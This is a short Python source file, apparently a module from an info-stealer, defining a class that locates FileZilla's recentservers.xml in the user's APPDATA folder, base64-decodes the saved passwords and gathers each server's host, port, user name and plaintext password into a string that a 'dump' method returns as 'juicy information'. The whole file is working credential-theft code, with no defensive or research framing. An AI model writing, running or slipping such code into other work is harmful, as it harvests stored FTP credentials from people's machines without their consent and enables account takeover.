import os
import base64
import xml.etree.ElementTree as ET

class Filezilla(object):

    def __init__(self):
        self.saved = ""
        self.grab_saved()

    def grab_saved(self):
        """
        Grabs stored passwords from the default filezilla config file, 
        if non-existant then it will return nothing.
        """
        filezilla =  os.path.join(os.getenv("APPDATA"), "FileZilla")
        if os.path.exists(filezilla):
            saved_pass_file = os.path.join(filezilla, "recentservers.xml")
            if os.path.exists(saved_pass_file):
                xml_tree = ET.parse(saved_pass_file).getroot()
                if xml_tree.findall('RecentServers/Server'):
                    servers = xml_tree.findall('RecentServers/Server')
                else:
                    servers = xml_tree.findall('Servers/Server')
 
                for server in servers:
                    host = server.find('Host')
                    port = server.find('Port')
                    user = server.find('User')
                    password = server.find('Pass')
                    full_pass = base64.b64decode(password.text).decode()
                    self.saved += f"HOST: {host.text}\nPORT: {port.text}\nUSER: {user.text}\nPASS: {full_pass}\n\n"

    def dump(self):
        """
        Just dumps the important
        juicy information
        """
        self.grab_saved()
        return self.saved